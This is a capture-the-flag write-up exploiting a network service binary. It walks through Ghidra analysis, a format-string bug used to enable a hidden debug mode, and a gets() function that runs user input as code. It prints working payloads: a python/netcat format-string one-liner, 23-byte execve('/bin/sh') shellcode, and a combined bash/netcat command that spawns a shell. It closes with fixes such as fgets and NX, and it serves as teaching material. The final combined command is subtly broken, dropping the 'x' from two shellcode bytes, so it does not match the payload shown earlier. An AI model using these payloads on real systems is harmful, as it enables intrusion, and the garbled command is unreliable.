Summary: You're given an elf file and the ability to netcat into a remote machine. The machine asks you to connect to another machine. You're also given the low-level code that runs the service. See if you can find a way to get into the device.

Initially, you're given two things: A service that runs on a remote port, and a file that you can use to analyze the service. 

Let's start by analyzing the port. We might run `nmap [IP] -[PORT] -sV` to get an idea of what the device is running. In this case, nmap can't discern exactly what it is. So, next we'll try to run netcat, and we get a proper return:

<img width="574" height="115" alt="Pasted image 20260917234907" src="https://github.com/user-attachments/assets/da61eda2-3328-4fe8-ab63-60473ab24372" />

From here, it didn't really matter what a little bit of 'manual fuzzing' got us--the return was always the same. Not to mention, we had nothing else to go off of at this point. So, let's look at the other piece we have--the file that runs the service. Take the file, and put it into Ghidra for some static code analysis!

Once in Ghidra, you'll be in an x86 Assembly/C environment. You're not expected to know how all of it works--just the main functions. It also helps if you know how to leverage the tools that make it easiest for a human to enumerate.

Once you're in, it'll look scary:

<img width="2266" height="936" alt="Pasted image 20260917234457" src="https://github.com/user-attachments/assets/ca964d94-0c03-4d37-b042-cfcc5a193fd9" />

But it's okay, we're gonna get through it.


Start by going to Search > For Strings. You might get a list of human-readable content that you can start interpreting:

<img width="900" height="399" alt="Pasted image 20260917234618" src="https://github.com/user-attachments/assets/79761288-17cc-4308-bc40-7d21a64f4139" />


This should put you into a function of some sort. Once you're there, it really helps to look at the C interpretation of the x86 assembly. It won't necessarily make it easy to interpret, but it's much better than x86

<img width="1569" height="675" alt="Pasted image 20260917235323" src="https://github.com/user-attachments/assets/dc322ae3-e0f6-4b06-b369-eb7a3fca65c2" />

You might notice that we found some strings in here that remind us of our return from earlier. Great! Let's see what else we can find in here. Search for strings again, and you might stumble across this in the C Decompiler:

<img width="393" height="303" alt="Pasted image 20260917235245" src="https://github.com/user-attachments/assets/6490dc46-f0ac-4f42-9109-7aedf46b9359" />

Interesting--looks like there's a debug mode on here! Let's see if we can take advantage of it. 

In binary exploitation, our goal is to find bugs in a program's memory and use those bugs to make the computer run our own instructions instead of what it was supposed to do.

Here is the Debug command explicitly:

C
void debug_command(void)
{
    undefined1 local_42 [50];
    code *local_10;
    
    puts("Running Debug Mode, Enter Debug Command: ");
    gets(local_42);
    puts("Executing...");
    local_10 = (code *)local_42;
    (*local_10)();
    return;
}
3. Finding the Bugs
We found two main security flaws that we had to combine to succeed:

Bug #1: The Print Secret (Format String Bug)
The initial screen took our text and printed it using a function that accidentally treated our input as commands rather than simple text.

Why it matters: Specific codes like %n tell the program: "Count how many letters have been printed so far, and save that number directly into a spot in the computer's memory."

How we used it: We used this bug overwrite ourselves at that location in memory, unlocking access to the hidden Debug Mode.

`(python3 -c 'import sys; sys.stdout.buffer.write(b"\x30\xc0\x04\x08" + b"%26c%6$n\n")'; cat) | nc 192.168.100.5 9002`

Bug #2: The Overflowing Cup (gets() and Buffer Overflow)
What happened: Inside debug_command, the code uses gets(). This function reads user input but never checks how much space is available.

The Memory Layout:

local_42 is a box in memory designed to hold 50 bytes of text.

local_10 sits right next to it in memory and holds a shortcut pointer telling the CPU what code to run next.

The program takes whatever we type into local_42 and tries to run it as code: (*local_10)().

Because of how the memory is laid out, local_10 sits exactly 34 bytes after local_42. If we type more than 34 bytes, our text spills over and crushes local_10. When local_10 gets crushed with bad data, the program panics and crashes.

4. Stage 1: Unlocking Debug Mode (Changing Program State)
Think of a running program like a train moving along tracks. The program's state is the track it is currently on—for example, Track A: Standard User versus Track B: Admin Debug Mode.

Normally, the program checks a hidden switch in memory (like a variable debug_enabled). If the switch is 0, you stay on Track A and are denied entry to Debug Mode.

Using Bug #1, we sent a special code:

Plaintext
\x30\xc0\x04\x08%26c%6$n\n
\x30\xc0\x04\x08: Pointed directly to the memory address holding that hidden switch (0x0804c030).

%26c%6$n: Printed 26 blank spaces, counted the total letters (30 bytes), and wrote the number 30 directly into that hidden switch.

When the program checked the switch again, it saw 30 instead of 0. It thought, "Aha! Debug Mode is turned on!" and flipped the tracks, letting us into debug_command.

5. Stage 2: Creating the Secret Payload (Shellcode)
Now that we were inside debug_command, we needed to send custom computer instructions (shellcode) to run a command shell (/bin/sh).

The 34-Byte Size Limit
Because typing more than 34 bytes crushes the shortcut pointer (local_10) and crashes the program, our attack code had to fit entirely inside 34 bytes. It also couldn't contain any Enter keys (\x0a), because gets() stops reading as soon as it sees an Enter.

The Final Payload (23 Bytes)
We used a tiny, 23-byte piece of machine code that tells the operating system to open a command line shell (execve("/bin/sh")):

\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80

6. Putting It All Together & Catching the Flag
We combined Stage 1 and Stage 2 into one simple Bash command:

Bash
(echo -ne "\x30\xc0\x04\x08%26c%6\$n\n"; sleep 1; echo -ne "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\89\xc1\89\xc2\xb0\x0b\xcd\x80\n"; cat) | nc 192.168.100.5 9002
Part 1 sent the format string, flipping the switch to unlock Debug Mode.

Part 2 sent our 23-byte shellcode. Because it was under 34 bytes, it fit safely inside local_42 without breaking local_10.

Running /bin/sh allowed us to spawn a shell. Once we're in, because we know it's running Linux, we can start running Linux commands. In this case, all we had to do was look in our local directory, and a flag.txt file was waiting for us to `cat`.

7. How to Fix These Bugs
Don't use gets(): Use safe functions like fgets() that limit how much text a user can enter so memory never spills over.

Format strings safely: Always write printf("%s", input) instead of printf(input) so user text isn't confused for system commands.

Turn on Memory Protections: Compile programs with NX (No-Execute) enabled, which stops the computer from running code out of basic text buffers.
